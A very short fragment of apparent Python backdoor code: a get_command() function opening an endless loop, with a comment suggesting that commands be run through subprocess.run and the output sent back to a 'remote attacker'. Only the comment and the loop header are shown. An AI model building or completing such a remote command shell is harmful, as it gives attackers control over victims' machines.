...
def get_command():
    # Update 21/11/2022: Instead of using some complexible command below, we can use `subprocess.run([command], capture_output=True)` and send result back to remote attacker
    while True:
